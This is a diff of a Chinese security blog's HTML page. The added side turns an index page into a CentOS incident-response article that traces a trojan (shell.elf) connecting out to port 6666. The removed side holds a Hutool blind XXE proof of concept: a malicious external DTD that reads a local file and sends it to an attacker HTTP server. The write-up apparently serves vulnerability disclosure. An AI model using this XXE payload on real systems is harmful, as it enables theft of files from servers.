@@ -4,18 +4,27 @@
   <meta charset="utf-8">
   
   
-  <title>FBD的渗透博客</title>
+  <title>某CentOS主机应急响应 | FBD的渗透博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="彩笔之路">
-<meta property="og:type" content="website">
-<meta property="og:title" content="FBD的渗透博客">
-<meta property="og:url" content="https://fbdhhhh47.github.io/index.html">
+  <meta name="description" content="实操1 CentOS首先查看异常连接端口：netstat -antp有异常链接到192.168.226.131:6666 是shell.elf，疑似木马根据pid查找位置： 1lsof -p pid  找到木马位置&#x2F;root&#x2F;shell.elf查看history和.bash_history发现记录已经被清除查找特权账户： 1awk -F: &amp;#x27;$3&#x3D;&#x3D;0 &amp;#123;p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某CentOS主机应急响应">
+<meta property="og:url" content="https://fbdhhhh47.github.io/2023/09/27/%E6%9F%90CentOS%E4%B8%BB%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.html">
 <meta property="og:site_name" content="FBD的渗透博客">
-<meta property="og:description" content="彩笔之路">
+<meta property="og:description" content="实操1 CentOS首先查看异常连接端口：netstat -antp有异常链接到192.168.226.131:6666 是shell.elf，疑似木马根据pid查找位置： 1lsof -p pid  找到木马位置&#x2F;root&#x2F;shell.elf查看history和.bash_history发现记录已经被清除查找特权账户： 1awk -F: &amp;#x27;$3&#x3D;&#x3D;0 &amp;#123;p">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/26349912/1692711302726-8d5223ec-bb87-4508-ab75-5596562e16df.png#averageHue=%2324292b&clientId=ue4ea1ff8-4d6c-4&from=paste&height=307&id=ue8d802dc&originHeight=461&originWidth=1555&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=116863&status=done&style=none&taskId=uec8845d6-6fd5-4e90-85ba-a758b39f026&title=&width=1036.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/26349912/1692711413021-18922eaf-3c6e-4c1a-b975-778166b66481.png#averageHue=%2325292b&clientId=ue4ea1ff8-4d6c-4&from=paste&height=199&id=ub0b6c123&originHeight=298&originWidth=1826&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=83406&status=done&style=none&taskId=ua1d35b90-39af-4433-829d-800b0732e5d&title=&width=1217.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/26349912/1693581046255-483d2476-4cfd-4eb4-ae26-334e52336f0d.png#averageHue=%2324292d&clientId=u8b435fc4-0de0-4&from=paste&height=71&id=ud5f7e12b&originHeight=106&originWidth=520&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=14411&status=done&style=none&taskId=u15f04d5e-37c4-447b-b118-d44da5b3c10&title=&width=346.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/26349912/1693581699530-e2c2816d-322c-4378-986c-9de80fe4c523.png#averageHue=%2324282a&clientId=u8b435fc4-0de0-4&from=paste&height=368&id=u87875260&originHeight=552&originWidth=772&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=80923&status=done&style=none&taskId=u08c07dd4-a27b-4a77-a70d-41cb010abbe&title=&width=514.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/26349912/1693581807070-0854735f-71dd-4762-b94f-32dfadfc408f.png#averageHue=%2324282c&clientId=u8b435fc4-0de0-4&from=paste&height=132&id=u89f0f4b7&originHeight=198&originWidth=1387&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=46097&status=done&style=none&taskId=u150541ba-bfc1-4074-8bb6-fb1f88a2c23&title=&width=924.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/26349912/1693582011807-212aadd9-0e16-4b4d-ac76-694086bc47bd.png#averageHue=%23fefcfb&clientId=u8b435fc4-0de0-4&from=paste&height=848&id=ue7e47c8b&originHeight=1272&originWidth=1816&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=203536&status=done&style=none&taskId=u72d2fa9d-b31d-4ec0-9906-bd4a1d41d50&title=&width=1210.6666666666667">
+<meta property="article:published_time" content="2023-09-27T07:59:59.000Z">
+<meta property="article:modified_time" content="2023-09-27T08:00:19.059Z">
 <meta property="article:author" content="FBDhhhh">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="应急响应">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/26349912/1692711302726-8d5223ec-bb87-4508-ab75-5596562e16df.png#averageHue=%2324292b&clientId=ue4ea1ff8-4d6c-4&from=paste&height=307&id=ue8d802dc&originHeight=461&originWidth=1555&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=116863&status=done&style=none&taskId=uec8845d6-6fd5-4e90-85ba-a758b39f026&title=&width=1036.6666666666667">
   
     <link rel="alternate" href="/atom.xml" title="FBD的渗透博客" type="application/atom+xml">
   
@@ -74,9 +83,7 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-某CentOS主机应急响应" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-某CentOS主机应急响应" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/09/27/%E6%9F%90CentOS%E4%B8%BB%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="article-date">
   <time class="dt-published" datetime="2023-09-27T07:59:59.000Z" itemprop="datePublished">2023-09-27</time>
@@ -89,8 +96,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/09/27/%E6%9F%90CentOS%E4%B8%BB%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">某CentOS主机应急响应</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      某CentOS主机应急响应
     </h1>
   
 
@@ -127,73 +134,19 @@
     </footer>
   </div>
   
-</article>
-
-
-
+    
+<nav id="article-nav">
   
-    <article id="hutool-hutool-XXE" class="h-entry article article-type-hutool" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/06/06/hutool-XXE/" class="article-date">
-  <time class="dt-published" datetime="2023-06-06T12:59:44.000Z" itemprop="datePublished">2023-06-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/06/hutool-XXE/">Hutool-XXE</a>
-    </h1>
+    <a href="/2023/06/06/hutool-XXE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Hutool-XXE</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>Hutool</strong> is a small but comprehensive library of Java tools. A blind XXE vulnerability exists in its XML parsing module before v5.8.19, which may lead to arbitrary file reading. </p>
-<h2 id="Position"><a href="#Position" class="headerlink" title="Position"></a>Position</h2><p>This vulnerability sources from the <strong>readBySax</strong> function in <strong>XmlUtil.java</strong>, which uses the SAXParserFactory and is by default susceptible to XXE attacks.</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">readBySax</span><span class="params">(InputSource source, ContentHandler contentHandler)</span> &#123;</span><br><span class="line">		<span class="comment">// 1.获取解析工厂</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">null</span> == factory) &#123;</span><br><span class="line">			factory = SAXParserFactory.newInstance();</span><br><span class="line">			factory.setValidating(<span class="literal">false</span>);</span><br><span class="line">			factory.setNamespaceAware(namespaceAware);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 2.从解析工厂获取解析器</span></span><br><span class="line">		<span class="keyword">final</span> SAXParser parse;</span><br><span class="line">		XMLReader reader;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			parse = factory.newSAXParser();</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
-
-<h3 id="Xxploitation"><a href="#Xxploitation" class="headerlink" title="Xxploitation"></a>Xxploitation</h3><p>First you need to parse an XML which lead to a malicious external DTD:</p>
-<p>xxeTest.java:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.hutool.core;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.collection.CollUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.resource.ResourceUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.XmlUtil;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.DefaultHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xxeTest</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="keyword">final</span> HashSet&lt;String&gt; eles = CollUtil.newHashSet(</span><br><span class="line">			<span class="string">&quot;returnssms&quot;</span>, <span class="string">&quot;returnstatus&quot;</span>, <span class="string">&quot;message&quot;</span>, <span class="string">&quot;remainpoint&quot;</span>, <span class="string">&quot;teskID&quot;</span>, <span class="string">&quot;successCounts&quot;</span>);</span><br><span class="line">		XmlUtil.readBySax(ResourceUtil.getStream(<span class="string">&quot;C:\\Users\\vanya\\Documents\\GitHub\\hutool\\hutool-core\\src\\main\\java\\cn\\hutool\\core\\test.xml&quot;</span>), <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>test.xml:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.3.183/evil.dtd&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>The malicious external DTD can be fetched through the HTTP server we deployed on 192.168.3.183:80.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-
-<p>Since the XmlUtil.java does not echo back to our parsing (which is called Blind XXE), the DTD reads arbitrary file through another HTTP request.</p>
-<p>evil.dtd:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///g:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://192.168.3.183:9999/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
-
-<p>Absolutely  we need to use netcat for port listening on 9999, we run xxeTest.java and it comes firstly the   request for evil.dtd then the request which contains the text we read from G:&#x2F;test.txt:</p>
-<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCiteYD"><img src="https://s1.ax1x.com/2023/06/06/pCiteYD.md.png" alt="pCiteYD.md.png"></a></p>
-<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCitZFO"><img src="https://s1.ax1x.com/2023/06/06/pCitZFO.md.png" alt="pCitZFO.md.png"></a></p>
-<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCitETK"><img src="https://s1.ax1x.com/2023/06/06/pCitETK.png" alt="pCitETK.png"></a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://fbdhhhh47.github.io/2023/06/06/hutool-XXE/" data-id="clikcv1hk0000i06rb5ao3gv5" data-title="Hutool-XXE" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li></ul>
-
-    </footer>
-  </div>
   
 </article>
-
-
-
-  
 
 
 </section>
